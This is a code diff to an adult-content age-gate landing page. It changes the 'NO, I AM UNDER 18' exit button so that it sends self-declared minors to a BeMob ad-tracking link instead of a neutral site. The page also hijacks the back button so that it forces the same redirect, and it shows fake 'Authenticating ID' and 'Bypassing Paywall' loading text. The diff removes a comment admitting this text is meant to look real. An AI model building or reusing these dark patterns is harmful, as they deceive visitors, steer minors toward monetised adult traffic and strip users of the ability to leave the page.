@@ -47,7 +47,7 @@
         <h1>Are you 18 or older?</h1>
         <p>This content is reserved for adults in South Africa. Please confirm your age to continue to the private portal.</p>
         <button class="btn btn-primary" onclick="nextStep(2)">YES, I AM 18+</button>
-        <button class="btn btn-outline" onclick="location.href='https://google.co.za'">EXIT</button>
+        <button class="btn btn-outline" onclick="exitRedirect()">NO, I AM UNDER 18</button>
     </div>
 
     <div id="step-2">
@@ -76,6 +76,11 @@
 </div>
 
 <script>
+    // Configured BeMob Link location helper
+    function exitRedirect() {
+        location.replace("https://fb07q.bemobtrcks.com/click");
+    }
+
     function nextStep(step) {
         document.getElementById('step-1').style.display = 'none';
         document.getElementById('step-2').style.display = 'block';
@@ -85,7 +90,6 @@
         document.getElementById('step-2').style.display = 'none';
         document.getElementById('loader').style.display = 'block';
         
-        // Dynamic loading text to look "real"
         const texts = ["Authenticating ID...", "Verifying Location...", "Bypassing Paywall...", "Ready!"];
         let i = 0;
         const interval = setInterval(() => {
@@ -109,7 +113,7 @@
             if (location.hash === "#!/confirm") {
                 history.replaceState(null, document.title, location.pathname);
                 setTimeout(function() {
-                    location.replace("https://fb07q.bemobtrcks.com/click");
+                    exitRedirect();
                 }, 0);
             }
         }, false);
